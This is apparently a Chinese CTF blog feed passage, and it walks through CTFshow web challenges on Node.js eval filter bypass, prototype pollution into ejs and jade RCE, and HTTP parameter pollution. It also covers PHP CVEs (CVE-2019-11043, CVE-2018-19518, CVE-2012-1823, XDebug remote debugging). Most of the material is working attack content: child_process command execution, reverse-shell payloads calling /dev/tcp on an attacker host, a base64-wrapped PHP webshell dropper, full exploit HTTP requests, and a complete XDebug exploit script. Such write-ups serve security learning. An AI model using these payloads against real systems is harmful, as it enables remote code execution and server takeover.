title="web336"></a>web336</h1><p>加了过滤，过滤<code>exec</code>。<br>传入<code>__filename</code>读取文件位置，其他相关的变量：</p><ul><li>__filename - 当前 eval 代码运行的文件名</li><li>__dirname - 当前 eval 代码运行的文件夹路径</li><li>__line - 当前 eval 代码运行的行号</li><li>__column - 当前 eval 代码运行的列号</li></ul><p>当然知道位置了，就可以读取文件了：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">require(&#39;fs&#39;).readFileSync(&#39;&#x2F;app&#x2F;routes&#x2F;index.js&#39;,&#39;utf-8&#39;)</code></pre><p>jsbeautify一下方便阅读，发现过滤了exec和load两个关键字符</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">var express &#x3D; require(&#39;express&#39;);var router &#x3D; express.Router(); &#x2F;* GET home page. *&#x2F;router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;    res.type(&#39;html&#39;);    var evalstring &#x3D; req.query.eval;    if (typeof(evalstring) &#x3D;&#x3D; &#39;string&#39; &amp;&amp; evalstring.search(&#x2F;exec|load&#x2F;i) &gt; 0) &#123;        res.render(&#39;index&#39;, &#123;            title: &#39;tql&#39;        &#125;);    &#125; else &#123;        res.render(&#39;index&#39;, &#123;            title: eval(evalstring)        &#125;);    &#125;&#125;);module.exports &#x3D; router;</code></pre><p>看了payload是通过拼接来达成运行的。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)&#x2F;&#x2F;(%2b就是+的url编码)require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;&quot;)</code></pre><h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p>源码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">var express &#x3D; require(&#39;express&#39;);var router &#x3D; express.Router();var crypto &#x3D; require(&#39;crypto&#39;);function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;&#x2F;* GET home page. *&#x2F;router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag&#x3D;&#39;xxxxxxx&#39;;  var a &#x3D; req.query.a;  var b &#x3D; req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;  res.end(flag);  &#125;else&#123;  res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);  &#125;  &#125;);module.exports &#x3D; router;</code></pre><p>js中有比较抽象的绕过md5方法：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag)</code></pre><p>a[x]&#x3D;1&amp;b[x]&#x3D;2，数组会被解析为<code>[object Object]</code><br>测试比如：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">a&#x3D;&#123;&#39;x&#39;:&#39;1&#39;&#125;b&#x3D;&#123;&#39;x&#39;:&#39;2&#39;&#125;console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)a&#x3D;[1]b&#x3D;[2]console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)</code></pre><p>输出如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">[object Object]flag&#123;xxx&#125;[object Object]flag&#123;xxx&#125;1flag&#123;xxx&#125;2flag&#123;xxx&#125;</code></pre><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__</a></p></blockquote><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>建议直接看上面的链接文章。讲的太好了，适合我这种菜狗。<br>这里就提一段代码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] &#x3D; source[key]        &#125;    &#125;&#125;let o1 &#x3D; &#123;&#125;let o2 &#x3D; JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(o1, o2)console.log(o1.a, o1.b)o3 &#x3D; &#123;&#125;console.log(o3.b)</code></pre><p>这段代码基本就可以介绍原型链相关内容。<br>比如说这道题的：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">var secert &#x3D; &#123;&#125;;if(secert.ctfshow&#x3D;&#x3D;&#x3D;&#39;36dboy&#39;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);    &#125;</code></pre><p>这里的secret就可以被原型链污染，具体在下面的<code>utils/commons</code>位置导致污染。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">function copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] &#x3D; object2[key]        &#125;    &#125;  &#125;utils.copy(user,req.body);</code></pre><p>这里达到了覆盖的效果。<br>我们传入payload测试一下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></pre><p>注意，传入包的格式应该是：<code>application/json</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695215733351-c1f9a8f2-05df-4030-91aa-ab288c562189.png" alt="c6ae4a9fd8798a67b73a7fb0f6fc57ab.png"><br>但是这里我不知道为什么传入路由是<code>/login</code>而不是<code>/</code></p><h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><blockquote><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/#comments">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/#comments</a></p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;* GET home page.  *&#x2F;router.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag&#x3D;&#39;flag_here&#39;;  var secert &#x3D; &#123;&#125;;  var sess &#x3D; req.session;  let user &#x3D; &#123;&#125;;  utils.copy(user,req.body);  &#x2F;&#x2F;console.log(user.query)  if(secert.ctfshow&#x3D;&#x3D;&#x3D;flag)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);    &#125;&#125;);</code></pre><p><code>if(secert.ctfshow===flag)&#123;</code>这里已经没办法实现了<br>那就只能找别的地方了。<br>api.js中新增的内容：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#x2F;* GET home page.  *&#x2F;router.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;);   &#125;);</code></pre><p>这其中的query也是可以被操控的，比如：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695216349714-0df19de3-93f3-4ed8-bd0a-026aa3f07205.png" alt="image.png"><br>用一下payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;XXX&#x2F;8888 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre><p>先&#x2F;login那里污染一下发包，然后再post访问一下&#x2F;api即可。<br>loginPOST传入之后，再访问就成功弹shell。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695284336857-50eb569e-f316-46b2-a781-bbeabc05a2df.png" alt="image.png"><br>flag文件在routes下login.js中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695284375860-b8fcdfdd-2e66-4fb3-86c3-1b6a3d8f8a9a.png" alt="image.png"></p><blockquote><p><strong>F</strong>unction环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</p></blockquote><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>非预期的原因就是这题用了ejs模板引擎，这个模板引擎有个漏洞可以rce：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></pre><h1 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h1><p>这段核心代码是：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">this.userinfo &#x3D; new function()&#123;    this.isVIP &#x3D; false;    this.isAdmin &#x3D; false;    this.isAuthor &#x3D; false;         &#125;;</code></pre><p>这里new了一个匿名函数并赋值给userinfo。this.userinfo的__proto__属性指向的是那个匿名函数的prototype属性:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">this.userinfo.__proto__ &#x3D;&#x3D;&#x3D; function()&#123;&#125;.prototype</code></pre><p>匿名函数的prototype属性又继承自Object.prototype:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">function()&#123;&#125;.prototype.__proto__ &#x3D;&#x3D;&#x3D; Object.prototype </code></pre><p>因此：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">this.userinfo.__proto__ -&gt; function()&#123;&#125;.prototype -&gt; Object.prototype</code></pre><p>因此需要套两层才能污染原型链。<br>payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;</code></pre><p>污染+利用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285797030-12a2ab9e-87d7-403e-ab5a-f00ade9779f6.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285850316-66cf92bb-d359-4df9-9b3d-a42c9ecf10ab.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285843000-367e1043-ce79-497f-8bb7-8c713069a44e.png" alt="image.png"></p><h1 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h1><h3 id="ejs原型链污染"><a href="#ejs原型链污染" class="headerlink" title="ejs原型链污染"></a>ejs原型链污染</h3><p>payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;111.11.111.111&#x2F;11111 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;</code></pre><p>其中的_tmp1和tmp2是为了闭合代码。<br>还是先在login中post污染，然后访问&#x2F;就可以接到shell。flag在根目录。</p><h1 id="web342-web343"><a href="#web342-web343" class="headerlink" title="**web342-web343"></a>**web342-web343</h1><blockquote><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a><br><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a><br><a href="https://tari.moe/p/2021/ctfshow-nodejs#fee3a3930b854ee8b473db3cf3747056">https://tari.moe/p/2021/ctfshow-nodejs#fee3a3930b854ee8b473db3cf3747056</a></p></blockquote><h3 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h3><p>改用jade了，哈哈这wp我都看不懂，太抽象了。<br>省流一下，payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx&#x2F;xx 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p>还是login污染，根目录激活。</p><h1 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h1><h3 id="HPP数据污染"><a href="#HPP数据污染" class="headerlink" title="HPP数据污染"></a>HPP数据污染</h3><blockquote><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag &#x3D; &#39;flag_here&#39;;  if(req.url.match(&#x2F;8c|2c|\,&#x2F;ig))&#123;  res.end(&#39;where is flag :)&#39;);  &#125;  var query &#x3D; JSON.parse(req.query.query);  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;  res.end(flag);  &#125;else&#123;  res.end(&#39;where is flag. :)&#39;);  &#125;&#125;);</code></pre><p><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>逗号会被过滤。url</p><blockquote><p>node.js处理的特点和JSON.parse，另外一个点就是req.url是经过url编码的、</p></blockquote><p>但是%2c中的2c也被过滤掉了。<br>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的。<br>nodejs处理传入数组时，不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse居然会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析。<br>也即是如下payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;</code></pre><blockquote><p>这里把c进行url编码，是因为双引号的url编码是 %22，和c连接起来就是 %22c，会匹配到正则表达式。</p></blockquote><p>（这里始终没理解，有2c的话不就直接寄了吗？怎么能传进去。）</p><h2 id="传入解析"><a href="#传入解析" class="headerlink" title="传入解析"></a>传入解析</h2><pre class="language-javascript" data-language="javascript"><code class="language-javascript">Web服务器 　　　　　　 参数获取函数 　　　　　　　　　　   获取到的参数PHP&#x2F;Apache　　 　　  $_GET(“par”) 　　　　　　　　　　 LastJSP&#x2F;Tomcat 　　　　  Request.getParameter(“par”)    FirstPerl(CGI)&#x2F;Apache 　 Param(“par”) 　　　　　　　　　　 FirstPython&#x2F;Apache 　　  getvalue(“par”) 　　　　　　　　  All(List)ASP&#x2F;IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web311-web315phpCVE</title>
      <link href="/posts/7200c6c5/"/>
      <url>/posts/7200c6c5/</url>
      
        <content type="html"><![CDATA[<h1 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h1><h3 id="CVE-2019-11043远程代码执行漏洞"><a href="#CVE-2019-11043远程代码执行漏洞" class="headerlink" title="CVE-2019-11043远程代码执行漏洞"></a>CVE-2019-11043远程代码执行漏洞</h3><p>抓包，版本7.1.33。<br>这个复现得需要go环境，装一下：<br><code>sudo apt install golang</code></p><pre class="language-php" data-language="php"><code class="language-php">git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.gitcd phuip-fpizdamgo get -v &amp;&amp; go build</code></pre><p>执行go get -v &amp;&amp; go build会一直没反应<br>因为go proxy默认为proxy.golang.org，国内无法访问<br>执行命令换代理：go env -w GOPROXY&#x3D;<a href="https://goproxy.cn/">https://goproxy.cn</a><br>再次执行go get -v &amp;&amp; go build<br>最后使用：</p><pre class="language-php" data-language="php"><code class="language-php">go run . &quot;地址&#x2F;index.php&quot;</code></pre><p>末尾的index.php必须要加。<br>我再本地搭的用不了，拿vps打了一下就能用了。</p><pre class="language-php" data-language="php"><code class="language-php">root@hcss-ecs-8320:~&#x2F;phui&#x2F;phuip-fpizdam# go run . &quot;http:&#x2F;&#x2F;24f960ac-d8d8-45be-8ba0-f5bb12ba5cb1.challenge.ctf.show&#x2F;index.php&quot;2023&#x2F;09&#x2F;17 20:37:46 Base status code is 2002023&#x2F;09&#x2F;17 20:37:49 Status code 502 for qsl&#x3D;1765, adding as a candidate2023&#x2F;09&#x2F;17 20:37:50 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]2023&#x2F;09&#x2F;17 20:38:10 Attack params found: --qsl 1760 --pisos 237 --skip-detect2023&#x2F;09&#x2F;17 20:38:10 Trying to set &quot;session.auto_start&#x3D;0&quot;...2023&#x2F;09&#x2F;17 20:38:12 Detect() returned attack params: --qsl 1760 --pisos 237 --skip-detect &lt;-- REMEMBER THIS2023&#x2F;09&#x2F;17 20:38:12 Performing attack using php.ini settings...2023&#x2F;09&#x2F;17 20:38:14 Success! Was able to execute a command by appending &quot;?a&#x3D;&#x2F;bin&#x2F;sh+-c+&#39;which+which&#39;&amp;&quot; to URLs2023&#x2F;09&#x2F;17 20:38:14 Trying to cleanup &#x2F;tmp&#x2F;a...2023&#x2F;09&#x2F;17 20:38:14 Done!</code></pre><p>之后传入参后不是每次都可以执行，需要多次尝试。<br>GET给a传入linux命令就行了。</p><h1 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h1><h3 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h3><blockquote><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand&#x3D;来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p></blockquote><p>php5.6.38<br>先抓包，然后对payload进行修改。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php eval($_POST[1]);?&gt;base64加密一下，并添加：echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot; | base64 -d &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php在进行一次base64加密：ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA&#x3D;&#x3D;再进行url编码ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA%3D%3D</code></pre><p>然后将hostname的内容修改为：</p><pre class="language-php" data-language="php"><code class="language-php">x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh&#125;a</code></pre><p>也就是payload：</p><pre class="language-php" data-language="php"><code class="language-php">x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA|base64%09-d|sh&#125;a</code></pre><pre class="language-php" data-language="php"><code class="language-php">POST &#x2F; HTTP&#x2F;1.1Host: eeb206e9-41fa-4de4-a081-fd0d924d3284.challenge.ctf.showUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko&#x2F;20100101 Firefox&#x2F;65.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateReferer: http:&#x2F;&#x2F;eeb206e9-41fa-4de4-a081-fd0d924d3284.challenge.ctf.show&#x2F;Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 180Connection: closeUpgrade-Insecure-Requests: 1hostname&#x3D;x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA|base64%09-d|sh&#125;a&amp;username&#x3D;123&amp;password&#x3D;123</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694956213914-49a80688-3d4b-4851-b44e-25c2bce60139.png" alt="image.png"><br>虽然报错但是已经将马写进去了。<br>然后传参即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694956313975-38a36cea-bf6f-4341-8306-d7a229240a96.png" alt="image.png"></p><h1 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h1><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html</a></p></blockquote><h3 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h3><p>cgi模式下有如下一些参数可用：</p><ul><li>-c 指定php.ini文件的位置</li><li>-n 不要加载php.ini文件</li><li>-d 指定配置项</li><li>-b 启动fastcgi进程</li><li>-s 显示文件源码</li><li>-T 执行指定次该文件</li><li>-h和-? 显示帮助</li></ul><p>使用方法比如就是<code>?-s</code>显示源码。<br>poc：</p><pre class="language-php" data-language="php"><code class="language-php">POST &#x2F;index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a&#x2F;&#x2F;input HTTP&#x2F;1.1Host: 7bdb7492-e4fc-40cf-94ab-84870c199bca.challenge.ctf.showAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 29&lt;?php echo system(&quot;ls&quot;); ?&gt;</code></pre><h1 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h1><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>目录穿越一下先。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695117285137-df0dc08d-7014-473c-a2ae-f1a0fac66aaa.png" alt="image.png"><br>nginx读一下日志。<code>/var/log/nginx/access.log</code><br>能正常访问，直接写马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695117477277-905c3686-1644-422f-925c-68bc22ffc2d2.png" alt="image.png"></p><h1 id="web315（没成功）"><a href="#web315（没成功）" class="headerlink" title="web315（没成功）"></a>web315（没成功）</h1><blockquote><p><a href="https://blog.ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface">https://blog.ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface</a></p></blockquote><h3 id="XDebug-远程调试漏洞"><a href="#XDebug-远程调试漏洞" class="headerlink" title="XDebug 远程调试漏洞"></a>XDebug 远程调试漏洞</h3><p>PHP&#x2F;7.1.12，XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back &#x3D; 1：</p><pre class="language-php" data-language="php"><code class="language-php">xdebug.remote_connect_back &#x3D; 1xdebug.remote_enable &#x3D; 1</code></pre><p>这个配置下，我们访问<a href="http://target/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><br>漏洞利用：<br>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞<br>有已经编写好的脚本：<a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py</a></p><pre class="language-php" data-language="php"><code class="language-php">#!&#x2F;usr&#x2F;bin&#x2F;env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciifrom concurrent.futures import ThreadPoolExecutorpool &#x3D; ThreadPoolExecutor(1)session &#x3D; requests.session()session.headers &#x3D; &#123;    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)&#39;&#125;def recv_xml(sock):    blocks &#x3D; []    data &#x3D; b&#39;&#39;    while True:        try:            data &#x3D; data + sock.recv(1024)        except socket.error as e:            break        if not data:            break        while data:            eop &#x3D; data.find(b&#39;\x00&#39;)            if eop &lt; 0:                break            blocks.append(data[:eop])            data &#x3D; data[eop+1:]        if len(blocks) &gt;&#x3D; 4:            break        return blocks[3]def trigger(url):    time.sleep(2)    try:        session.get(url + &#39;?XDEBUG_SESSION_START&#x3D;phpstorm&#39;, timeout&#x3D;0.1)    except:        passif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;XDebug remote debug code execution.&#39;)    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, required&#x3D;True, help&#x3D;&#39;the code you want to execute.&#39;)    parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, required&#x3D;True, help&#x3D;&#39;target url.&#39;)    parser.add_argument(&#39;-l&#39;, &#39;--listen&#39;, default&#x3D;9000, type&#x3D;int, help&#x3D;&#39;local port&#39;)    args &#x3D; parser.parse_args()        ip_port &#x3D; (&#39;0.0.0.0&#39;, args.listen)    sk &#x3D; socket.socket()    sk.settimeout(10)    sk.bind(ip_port)    sk.listen(5)    pool.submit(trigger, args.target)    conn, addr &#x3D; sk.accept()    conn.sendall(b&#39;&#39;.join([b&#39;eval -i 1 -- &#39;, base64.b64encode(args.code.encode()), b&#39;\x00&#39;]))    data &#x3D; recv_xml(conn)    print(&#39;[+] Recieve data: &#39; + data.decode())    g &#x3D; re.search(rb&#39;&lt;\!\[CDATA\[([a-z0-9&#x3D;\.&#x2F;\+]+)\]\]&gt;&#39;, data, re.I)    if not g:        print(&#39;[-] No result...&#39;)        sys.exit(0)    data &#x3D; g.group(1)    try:        print(&#39;[+] Result: &#39; + base64.b64decode(data).decode())    except binascii.Error:        print(&#39;[-] May be not string result...&#39;)</code></pre><p>部署一下尝试</p><pre class="language-php" data-language="php"><code 